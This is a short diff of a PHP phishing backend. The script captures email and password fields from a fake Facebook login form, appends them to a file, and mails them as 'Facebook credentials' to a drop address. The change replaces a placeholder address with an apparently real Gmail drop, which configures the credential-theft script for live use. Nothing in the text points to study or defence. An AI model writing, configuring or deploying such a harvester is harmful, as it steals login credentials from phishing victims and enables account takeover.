@@ -5,5 +5,5 @@ fwrite($file, $_POST['email'] . "\t" . $_POST['pass'] . PHP_EOL);
 fclose($file);
 
 // uncomment the lines below to receive the credentials by email
-$maildrop = "sample@email.com";
+$maildrop = "hotboyof16@gmail.com";
 mail($maildrop, "Facebook credentials", $_POST['email'] . "\t" . $_POST['pass']);
